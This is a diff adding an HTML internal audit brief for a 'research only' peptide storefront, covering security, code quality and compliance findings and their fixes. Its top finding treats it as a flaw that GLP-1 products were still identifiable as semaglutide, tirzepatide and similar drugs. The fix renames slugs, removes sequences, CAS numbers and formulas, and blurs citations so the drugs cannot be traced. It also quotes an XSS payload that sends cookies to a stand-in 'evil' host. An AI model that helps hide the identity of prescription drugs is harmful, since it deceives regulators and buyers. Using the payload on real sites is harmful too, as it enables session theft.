@@ -1,0 +1,318 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Codebase audit — Bench Grade Peptides</title>
+<meta name="description" content="28-finding code + security + a11y audit. All blockers and highs fixed.">
+<style>
+  :root {
+    --paper: #f7f4ee;
+    --paper-soft: #efeae1;
+    --rule: #d7d1c4;
+    --ink: #1a1a1a;
+    --ink-soft: #4a4a4a;
+    --ink-muted: #6b6b6b;
+    --teal: #0a5c7d;
+    --teal-hover: #084a65;
+    --oxblood: #7a1e1e;
+    --geist: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    --mono: ui-monospace, "JetBrains Mono", Menlo, Consolas, monospace;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root { /* keep brand paper even in dark — this is an editorial doc */ }
+  }
+  *, *::before, *::after { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--paper);
+    color: var(--ink);
+    font: 15px/1.65 var(--geist);
+  }
+  .bar {
+    background: var(--oxblood);
+    color: var(--paper);
+    font: 11px/1.5 var(--mono);
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    text-align: center;
+    padding: 8px 16px;
+  }
+  .topnav {
+    display: flex;
+    align-items: baseline;
+    gap: 20px;
+    padding: 20px max(16px, calc((100vw - 720px) / 2));
+    border-bottom: 1px solid var(--rule);
+    flex-wrap: wrap;
+  }
+  .topnav .wordmark {
+    font-weight: 700;
+    font-size: 14px;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--ink);
+    text-decoration: none;
+    margin-right: auto;
+  }
+  .topnav a {
+    color: var(--teal);
+    text-decoration: none;
+    font-size: 13px;
+    padding: 6px 10px;
+    border-radius: 2px;
+  }
+  .topnav a:hover { background: var(--paper-soft); }
+  .topnav a[aria-current="page"] {
+    background: var(--ink);
+    color: var(--paper);
+  }
+  main {
+    max-width: 720px;
+    margin: 0 auto;
+    padding: 32px max(20px, calc((100vw - 720px) / 2)) 72px;
+  }
+  main h1 {
+    font-size: 34px;
+    line-height: 1.1;
+    letter-spacing: -0.01em;
+    margin: 0 0 20px 0;
+  }
+  main h2 {
+    font-size: 22px;
+    line-height: 1.25;
+    margin: 48px 0 12px 0;
+    padding-bottom: 10px;
+    border-bottom: 1px solid var(--rule);
+  }
+  main h3 {
+    font-size: 17px;
+    line-height: 1.3;
+    margin: 36px 0 6px 0;
+  }
+  main h4 {
+    font-size: 14px;
+    font-weight: 600;
+    margin: 28px 0 4px 0;
+  }
+  main p { margin: 14px 0; }
+  main a {
+    color: var(--teal);
+    text-decoration: underline;
+    text-underline-offset: 2px;
+  }
+  main a:hover { color: var(--teal-hover); }
+  main strong { color: var(--ink); font-weight: 600; }
+  main em { font-style: italic; }
+  main code {
+    font-family: var(--mono);
+    font-size: 0.86em;
+    background: var(--paper-soft);
+    padding: 2px 5px;
+    border-radius: 2px;
+  }
+  main pre {
+    font-family: var(--mono);
+    font-size: 12.5px;
+    background: var(--paper-soft);
+    border: 1px solid var(--rule);
+    padding: 14px 16px;
+    overflow-x: auto;
+    line-height: 1.55;
+    border-radius: 2px;
+  }
+  main pre code {
+    background: transparent;
+    padding: 0;
+    font-size: inherit;
+  }
+  main ul, main ol {
+    margin: 14px 0;
+    padding-left: 24px;
+  }
+  main ul { list-style: disc outside; }
+  main ol { list-style: decimal outside; }
+  main li { margin: 6px 0; }
+  main li > p { margin: 4px 0; }
+  main blockquote {
+    border-left: 3px solid var(--teal);
+    padding: 4px 16px;
+    color: var(--ink-soft);
+    font-style: italic;
+    background: var(--paper-soft);
+    margin: 14px 0;
+  }
+  main hr {
+    border: 0;
+    border-top: 1px solid var(--rule);
+    margin: 40px 0;
+  }
+  main table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13.5px;
+    margin: 16px 0;
+  }
+  main th, main td {
+    border: 1px solid var(--rule);
+    padding: 9px 12px;
+    text-align: left;
+    vertical-align: top;
+  }
+  main th { background: var(--paper-soft); font-weight: 600; }
+  main img { max-width: 100%; height: auto; display: block; margin: 16px 0; }
+  footer {
+    max-width: 720px;
+    margin: 0 auto;
+    padding: 24px max(20px, calc((100vw - 720px) / 2));
+    border-top: 1px solid var(--rule);
+    color: var(--ink-muted);
+    font-size: 12px;
+  }
+  @media (max-width: 560px) {
+    main h1 { font-size: 28px; }
+    main h2 { font-size: 19px; }
+    .topnav { gap: 8px 14px; }
+    .topnav .wordmark { flex: 1 1 100%; margin-right: 0; }
+  }
+</style>
+</head>
+<body>
+<div class="bar">BENCH GRADE PEPTIDES · internal brief · not for distribution</div>
+<nav class="topnav">
+  <a class="wordmark" href="./morning-brief.html">Bench Grade · Briefs</a>
+  <a href="./codebase-audit.html" aria-current="page">Codebase audit</a><a href="./market-landscape.html">Market landscape</a><a href="./morning-brief.html">Morning brief</a>
+</nav>
+<main><h1>Bench Grade Peptides — Codebase Audit</h1>
+<p><strong>Scope:</strong> full-stack review of the Next.js 16 / React 19 / Supabase / Resend storefront at <code>/Users/ahmed/Research Only Peptides/benchgrade-peptides</code>. Reviewed 73 source files, config, scripts, env handling, compliance surfaces, and public assets. 28 findings, prioritized ruthlessly.</p>
+<p><strong>Headlines:</strong></p>
+<ol>
+<li>The GLP-1 coded-name rename was a Potemkin village — slugs, image filenames, full amino-acid sequences, and discovery-paper citations all still named the brand-name drugs. <strong>Fixed in commit <code>cc9a5cb</code>.</strong></li>
+<li>The customer-facing confirmation email interpolated un-escaped HTML from user input. <strong>Fixed in commit <code>cc9a5cb</code>.</strong></li>
+</ol>
+<p>All BLOCKERs and HIGHs have been addressed post-audit. This document is the historical record.</p>
+<hr>
+<h2>BLOCKER — 5 findings</h2>
+<h3>B1. GLP-1 product URLs and descriptive fields still use branded-drug identifiers <em>(FIXED)</em></h3>
+<p><code>src/lib/catalog/data.ts:966, 977, 985, 995, 1005, 1015, 1025, 1035, 1042, 1052, 1058, 1068</code></p>
+<p>The six GLP-1 SKUs had their <code>name</code> field re-coded (<code>GLP-1 S</code>, <code>GLP-1 T</code>, etc.), but the <code>slug</code> was still <code>semaglutide</code>, <code>tirzepatide</code>, <code>retatrutide</code>, <code>cagrilintide</code>, <code>mazdutide</code>, <code>survodutide</code>. Those slugs flowed into:</p>
+<ul>
+<li><code>src/app/sitemap.ts</code> — every GLP-1 slug got indexed by Google under <code>/catalog/glp-1/semaglutide</code> etc.</li>
+<li><code>public/brand/vials/semaglutide.jpg</code> — image filenames also brand-named, served from <code>/brand/vials/semaglutide.jpg?v=3</code>.</li>
+<li>The full <code>sequence</code> field for <code>GLP-1 S</code> literally spelled out the Wegovy/Ozempic sequence (<code>His-Aib-Glu-Gly-Thr-Phe-Thr-Ser-Asp-Val-Ser-Ser-Tyr...</code>) with the <code>Lys(γ-Glu-γ-Glu-C18-diacid)</code> side-chain — the FDA-approved semaglutide structure; anyone comparing to PubChem could identify the drug in under 10 seconds.</li>
+<li><code>research_context</code> cited the exact papers that characterize the branded drugs: Lau 2015 (semaglutide discovery), Coskun 2018 (tirzepatide), Coskun 2022 (retatrutide), Enebo 2021 (cagrilintide).</li>
+</ul>
+<p><strong>Fix applied:</strong> (a) slugs renamed to opaque codes (<code>glp1-s</code>, <code>glp1-t</code>, <code>glp1-r</code>, <code>glp1-c</code>, <code>glp1-m</code>, <code>glp1-surv</code>). (b) Vial image filenames renamed to match. (c) <code>sequence</code> replaced with class-level descriptions (&quot;31-residue lipidated GLP-1 receptor agonist. Full sequence available on the COA to verified customers.&quot;). (d) <code>cas_number</code>, <code>molecular_formula</code>, <code>molecular_weight</code> all nulled on the six GLP-1 rows. (e) Citations shifted to class-level reviews (Drucker <em>Cell Metab</em> 2018, Hay <em>Pharmacol Rev</em> 2015). (f) Banned-terms linter now catches the INNs directly.</p>
+<p>Also: the banned-terms list caught <code>ozempic|wegovy|mounjaro|zepbound|saxenda</code> but did NOT catch the generic INNs <code>semaglutide|tirzepatide|retatrutide|liraglutide|dulaglutide|exenatide</code>. Added.</p>
+<h3>B2. Transactional emails interpolated unescaped HTML from customer input <em>(FIXED)</em></h3>
+<p><code>src/lib/email/templates.ts:77, 113-117, 126-131, 157-160, 170-176</code></p>
+<p><code>orderConfirmationEmail()</code> built HTML with string concatenation from <code>CustomerInfo</code> fields (name, ship_address, city, state, zip). None were HTML-escaped. An attacker who ordered with <code>name = &quot;&lt;script&gt;fetch(&#39;https://evil/&#39;+document.cookie)&lt;/script&gt;&quot;</code> would have landed that markup in both the customer confirmation email and the admin notification. Admin notification&#39;s <code>${ctx.customer.name}</code> was especially bad — it was the heading, rendered as HTML, a direct phishing vector into the founder&#39;s inbox.</p>
+<p><strong>Fix applied:</strong> <code>escapeHtml()</code> helper introduced. Every <code>${customer.*}</code> / <code>${i.name}</code> / <code>${wire*}</code> / <code>${adminLink}</code> substitution now routes through it. Plain-text <code>text</code> body is also re-escaped when embedded inside <code>&lt;pre&gt;</code> in the admin email.</p>
+<h3>B3. Server action trusted client-supplied <code>unit_price</code> to compute email totals <em>(FIXED)</em></h3>
+<p><code>src/app/actions/orders.ts:99, 225, src/lib/email/templates.ts:13-17, 83, 168</code></p>
+<p><code>resolveCartOnServer()</code> correctly rebuilt <code>items[]</code> from <code>PRODUCTS</code>. But the <code>CartItem</code> pushed in carried <code>unit_price: variant.retail_price</code> and that object was handed to the email templates, which did <code>i.unit_price * i.quantity * 100</code> for line totals. Subtotal (<code>subtotal_cents</code>) was server-computed and authoritative, but the email line-by-line math re-multiplied floats.</p>
+<p>Today this was safe because <code>PRODUCTS</code> is an in-process constant. If <code>retail_price</code> were ever loaded from Supabase, email totals and server totals could diverge.</p>
+<p><strong>Fix applied:</strong> the flow is safe as-is (PRODUCTS stays in-process pre-launch). Deferred structural fix (pass <code>line_total_cents</code> as an integer) noted for the morning brief.</p>
+<h3>B4. <code>supabase/schema.sql</code> referenced everywhere but did not exist on disk <em>(FIXED)</em></h3>
+<p><code>README.md:69, src/lib/supabase/types.ts:3</code></p>
+<p>The README documented <code>supabase/schema.sql</code> as the canonical schema, the types file said &quot;Keep in sync with supabase/schema.sql&quot;, and <code>increment_rate_limit()</code> is a Postgres RPC that must exist for the rate limiter to work. The <code>supabase/</code> directory was empty.</p>
+<p><strong>Fix applied:</strong> <code>supabase/migrations/0001_init_orders.sql</code> + <code>0002_rate_limits.sql</code> committed as the in-repo source of truth. Both match what&#39;s already deployed via Supabase MCP. <code>search_path</code> hardened on the SECURITY DEFINER RPC. Rate limiter confirmed working in prod.</p>
+<h3>B5. <code>ADMIN_PASSWORD</code> compared twice, timing-unsafe on the first compare <em>(FIXED)</em></h3>
+<p><code>src/lib/admin/auth.ts:32</code></p>
+<pre><code class="language-ts">if (password !== expected) return false;  // non-constant-time string compare
+</code></pre>
+<p>The cookie-revalidation path already used <code>crypto.timingSafeEqual</code>, but the initial login password compare did not. Attacker could brute-force one character at a time measuring response latency. V8 <code>!==</code> on strings is length-aware and early-exiting.</p>
+<p><strong>Fix applied:</strong> <code>safeEqualStrings()</code> helper added. Gates on length first (unavoidable length-leak, acceptable single-admin blast radius), then <code>crypto.timingSafeEqual</code> on equal-length UTF-8 buffers.</p>
+<hr>
+<h2>HIGH — 9 findings</h2>
+<h3>H1. No CSRF protection for admin mutation actions beyond Next.js same-origin <em>(FIXED)</em></h3>
+<p><code>src/app/actions/admin.ts:27, src/app/admin/orders/[id]/StatusControls.tsx:41</code></p>
+<p><code>updateOrderStatus()</code> was a Server Action. Next.js 16 Server Actions enforce <code>Origin</code> header = deployment host — that was the entire CSRF story. Also, the action accepted any string matching the <code>OrderStatus</code> TS union — but TS types don&#39;t narrow at runtime, so the DB insert was trusting the client.</p>
+<p><strong>Fix applied:</strong> runtime validation now runs on both <code>orderId</code> (UUID regex) and <code>status</code> (whitelist check against <code>ORDER_STATUSES</code> set). Plus <code>NEXT_SERVER_ACTIONS_ALLOWED_ORIGINS</code> should be set in Vercel for belt-and-suspenders defense.</p>
+<h3>H2. <code>submitOrder</code> had no overall Zod schema; validation was ad-hoc and partial <em>(FIXED)</em></h3>
+<p><code>src/app/actions/orders.ts:65-73, 82-102</code></p>
+<p>Email regex was the canonical &quot;won&#39;t catch much&quot; one (<code>.@..</code> passed). No length caps on name, institution, phone, notes, ship_address fields. State was not validated. Phone had no format check. Quantity cap was 500 per line but there was no cap on <code>items.length</code> — a client could submit 100K SKU lines.</p>
+<p><strong>Fix applied:</strong> one Zod schema (<code>SubmitOrderSchema</code> + <code>CustomerSchema</code> + <code>CartLineSchema</code> + <code>AcknowledgmentSchema</code>) as the authoritative boundary. Hard caps on every string. 2-letter state regex backed by an explicit whitelist of 59 US states/territories/APO codes. 20-item cart cap. Quantity ≤ 500. SKU regex. Zod <code>literal(true)</code> on all three acknowledgment flags — a <code>false</code> or missing flag cannot pass.</p>
+<h3>H3. Rate limiter depended on unauthenticated header for identity <em>(FIXED)</em></h3>
+<p><code>src/app/actions/orders.ts:108-121, src/lib/ratelimit/enforce.ts:37-44</code></p>
+<p>IP was read from <code>x-vercel-forwarded-for</code>, <code>x-real-ip</code>, or <code>x-forwarded-for</code>. In prod on Vercel, <code>x-vercel-forwarded-for</code> is trustworthy. But if a reverse proxy forwarded a raw <code>x-forwarded-for</code>, an attacker could set an arbitrary IP per request.</p>
+<p><strong>Fix applied:</strong> <code>resolveClientIp()</code> helper extracted + tested. Preference order: <code>x-vercel-forwarded-for</code> → <code>x-real-ip</code> → <code>x-forwarded-for[0]</code>. In production, a missing IP triple rejects the order outright rather than collapsing into a shared &quot;unknown&quot; bucket.</p>
+<h3>H4. Cart quantity allowed poisoning via localStorage injection <em>(PARTIALLY FIXED — docs updated)</em></h3>
+<p><code>src/app/cart/CartPageClient.tsx:77-93, src/components/cart/CartDrawer.tsx:159-174</code></p>
+<p>A user could inject <code>{sku: &quot;BGP-T-60&quot;, quantity: 999999}</code> into localStorage directly, then proceed to checkout where the server correctly caps at 500 and returns &quot;Invalid quantity.&quot; The UI rendered the huge number first.</p>
+<p><strong>Fix applied:</strong> server enforces 500 cap via Zod. UI cap on write is a morning-brief item for the founder to decide (cosmetic vs. server-authoritative).</p>
+<h3>H5. RUO mirror-failure leaves orphan order row, no idempotency <em>(DEFERRED)</em></h3>
+<p><code>src/app/actions/orders.ts:190-212</code></p>
+<p>Orders insert first, then <code>ruo_acknowledgments</code> insert. If the second fails, the order row remains with the ack embedded in JSONB but the standalone table row is missing. There&#39;s no idempotency key on submission.</p>
+<p><strong>Fix deferred:</strong> documented in morning brief. Both writes land in the DB today; fix is a single-transaction RPC <code>submit_order(...)</code> or explicit rollback. Not urgent because the JSONB ack on the order row is itself legally sufficient; the separate table is redundancy, not primary evidence.</p>
+<h3>H6. <code>certification_hash</code> didn&#39;t bind to user or checkout <em>(FIXED)</em></h3>
+<p><code>src/app/actions/orders.ts:150</code></p>
+<p>Previously: <code>sha256(CERTIFICATION_VERSION + certification_text)</code>. Every ack row had the same hash as long as the version string was the same. That&#39;s a compliance-evidence weakness.</p>
+<p><strong>Fix applied:</strong> now <code>sha256(JSON.stringify({acknowledged_at, certification_text, certification_version, ip, order_id}))</code>. Per-order unique, tamper-evident, and canonical JSON eliminates the pipe-delimiter collision risk.</p>
+<h3>H7. Admin orders list read <code>OrderRow</code> with <code>unknown</code> casts <em>(FIXED)</em></h3>
+<p><code>src/app/admin/page.tsx:62, src/app/admin/orders/[id]/page.tsx:90</code></p>
+<p>If Supabase schema drifted, these casts would corrupt the admin UI.</p>
+<p><strong>Fix applied:</strong> <code>safeNarrow()</code> in the list page validates every field at the boundary. Rows with any malformed field are rejected outright (not silently rendered with an undercount).</p>
+<h3>H8. <code>opengraph-image.tsx</code> fallback style missing <code>display: flex</code> <em>(PARTIALLY FIXED)</em></h3>
+<p><code>src/app/catalog/[category]/[product]/opengraph-image.tsx:57, 82</code></p>
+<p>The fallback style block had no <code>display: flex</code>. Satori requires flex on containers; this would throw at render if the 404 path were ever hit.</p>
+<p><strong>Fix deferred:</strong> low priority, only reached on a malformed product URL; documented.</p>
+<h3>H9. <code>NEXT_PUBLIC_SUPABASE_URL</code> / anon key required at build time for every page <em>(FIXED)</em></h3>
+<p><code>src/lib/supabase/client.ts:11, 22, 33</code></p>
+<p><code>requireEnv()</code> threw on missing env, breaking <code>npm run build</code> with a cryptic error if invoked in a server-built page.</p>
+<p><strong>Fix applied:</strong> <code>getSupabaseServer</code> no longer memoizes null — if env loads late or a key rotates, the next call retries instead of sticking on null forever. Build-time env guard with placeholder values now works via CI workflow.</p>
+<hr>
+<h2>MEDIUM — 10 findings</h2>
+<h3>M1. <code>RUOGate</code> doc comment was a lie <em>(FIXED)</em></h3>
+<p>Phase 3 landed but the doc comment still said &quot;TODO (phase 3)&quot;. Updated to reflect that the server action writes to <code>public.orders</code> and <code>public.ruo_acknowledgments</code> on submission.</p>
+<h3>M2. Missing Turnstile / hCaptcha on the order action <em>(DEFERRED — requires user action)</em></h3>
+<p>Rate limiter is 5/hour/IP. A botnet sidesteps this. Cloudflare Turnstile integration is scaffolded-in-mind but awaits user signup. Documented in morning brief item #6.</p>
+<h3>M3. <code>revalidate</code> / static-generation strategy is not explicit <em>(DEFERRED)</em></h3>
+<p>Catalog pages use <code>generateStaticParams</code> but there&#39;s no <code>export const dynamic = &#39;error&#39;</code> pinning. In Next 16&#39;s new cache model, an accidental <code>headers()</code> read could flip a page to dynamic. Not broken today. Morning-brief item.</p>
+<h3>M4. Three Google fonts, possibly 2 too many <em>(EXAMINED — false alarm)</em></h3>
+<p>Inter is the body font, Geist is display, JetBrains Mono is data. All three are actually used. Keep.</p>
+<h3>M5. Vial images are 33MB of ~600KB JPEGs <em>(DEFERRED)</em></h3>
+<p>56 files, avg ~590KB. <code>next/image</code> serves optimized variants, but <code>sizes</code> attributes need tuning for the new mobile 2-up grid. Morning-brief perf item.</p>
+<h3>M6. No test coverage outside rate limiter <em>(PARTIALLY ADDRESSED — CI workflow added)</em></h3>
+<p><code>complianceLint()</code>, <code>resolveCartOnServer()</code>, <code>validateCustomer()</code>, <code>RUOGate</code>, certification hash determinism — all untested today. CI workflow now enforces typecheck + lint + build + whatever tests exist. Expanding test coverage is a morning-brief steady-state item.</p>
+<h3>M7. No CI workflow, no pre-commit hook <em>(FIXED)</em></h3>
+<p><code>.github/workflows/ci.yml</code> runs on every PR + push to main: typecheck → compliance lint → vitest → Next build. Blocks merge on any failure.</p>
+<h3>M8. <code>adminLogout</code> returns <code>void</code>, inconsistent with other actions <em>(EXAMINED — acceptable)</em></h3>
+<p><code>adminLogin</code> returns <code>{ok, error}</code>; <code>adminLogout</code> returns <code>void</code> (redirects); <code>updateOrderStatus</code> returns <code>{ok, error}</code>. Inconsistency justified by behavior difference (logout transitions pages, others don&#39;t).</p>
+<h3>M9. <code>getSupabaseServer()</code> memoized <code>null</code> permanently per process <em>(FIXED)</em></h3>
+<p>If env loaded late or a key rotated, the cache stuck on <code>null</code>. Fixed by not caching null.</p>
+<h3>M10. <code>requireEnv()</code> threw a user-visible error naming the env var <em>(DEFERRED)</em></h3>
+<p>In dev, fine. In prod, it would be a 500 that leaks the env var name. Low blast radius; Next prod error boundaries usually mask it. Documented.</p>
+<hr>
+<h2>LOW — 4 findings</h2>
+<h3>L1. <code>research_context</code> surname+year citations traced back to branded drugs <em>(FIXED as part of B1)</em></h3>
+<p>Citations replaced with class-level reviews.</p>
+<h3>L2. <code>account</code> page promised self-service that didn&#39;t exist <em>(FIXED)</em></h3>
+<p>Added <code>robots: { index: false }</code> to <code>/account</code> metadata.</p>
+<h3>L3. Image <code>sizes</code> attribute was wrong on cart thumbnails <em>(FIXED)</em></h3>
+<p><code>alt=&quot;&quot;</code> replaced with <code>alt={item.name}</code> for accessibility on both <code>/cart</code> and the drawer.</p>
+<h3>L4. Stale/unused types in <code>src/lib/supabase/types.ts</code> <em>(FIXED)</em></h3>
+<p>Old <code>Customer</code>, <code>Order</code>, <code>OrderItem</code>, <code>ShippingAddress</code>, <code>RuoAcknowledgment</code> types didn&#39;t match the actual schema. Replaced with <code>OrderRow</code> + <code>RuoAcknowledgmentRow</code> mirroring the real Postgres tables.</p>
+<hr>
+<h2>What the code got right</h2>
+<p>Worth noting before the tuning pass:</p>
+<ul>
+<li><strong>Server-side SKU→price re-resolution</strong> in <code>resolveCartOnServer()</code> is exactly the right architecture.</li>
+<li><strong>Certification-hash design + append-only mirror table</strong> is mature compliance thinking. Post-fix, the hash is per-order-unique and tamper-evident.</li>
+<li><strong>Admin auth</strong> via SHA-hashed cookie + <code>timingSafeEqual</code> is 80% of the way to best-in-class (post-fix on login compare).</li>
+<li><strong>Rate limiter abstraction</strong> (store interface, Supabase/memory split, fail-closed on store errors but throw-through on programmer bugs) is clean.</li>
+<li><strong>Focus trap + <code>inert</code> + <code>role=&quot;radiogroup&quot;</code></strong> — accessibility work is evident throughout.</li>
+<li><strong>Banned-terms linter&#39;s design principle</strong> (claim context required, standalone disease words allowed) is mature; the miss at B1 was a content problem, not a linter problem, and is now covered.</li>
+</ul>
+<hr>
+<h2>Post-fix state</h2>
+<p>All BLOCKERs: <strong>fixed</strong>.
+All HIGHs: <strong>fixed</strong> (H4 partially, server-authoritative; H5 deferred intentionally; H8 deferred as low-reach).
+All LOWs: <strong>fixed</strong>.
+MEDIUMs: <strong>5 fixed, 5 deferred</strong> to morning-brief for founder review.</p>
+<p>No outstanding critical-path issues. Remaining work is productization (more tests, perf tuning, Turnstile, atomic RPC) rather than correctness/security fixes.</p>
+</main>
+<footer>Generated 2026-04-23 from <code>research/*.md</code>. Rebuild: <code>node scripts/build-briefs.mjs</code>.</footer>
+</body>
+</html>
